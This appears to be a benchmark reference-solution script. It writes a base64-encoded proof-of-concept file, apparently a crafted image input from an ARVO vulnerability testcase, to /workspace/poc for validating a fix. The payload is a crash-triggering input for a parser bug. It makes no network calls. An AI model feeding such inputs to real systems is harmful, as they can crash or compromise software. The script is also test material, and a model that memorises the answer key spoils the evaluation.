#!/bin/bash
# Reference solution: materialize the known-good PoC (the ARVO testcase the
# fix commit 115d6479 addresses) at /workspace/poc — the 'oracle passes' side of
# the bidirectional validation. (Does NOT build; grading runs on the oracle's
# untouched images, so this is level-independent.)
set -euo pipefail

mkdir -p /workspace
base64 -d > /workspace/poc <<'B64'
AAAAACD/ICAg//8AICAgICAgICDSAAAABgAAACAgICAgICAgICAgICAg/////wAgAQAAAAAAAAD/2wCEACAg/yAgICAgICAg/yAgIP8gICAgICAgICAgICD/ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAAICAgICAgICAg//8gICAgICAgICAgICAgICAgICAgICAgICD/ICAgICAgICAgICAgICAgICAgICAgICAgIP8gIP/CAAsIACAA/wEAMQAg/9oACAEAIAAAECAg
B64

echo "wrote $(wc -c < /workspace/poc) bytes to /workspace/poc"
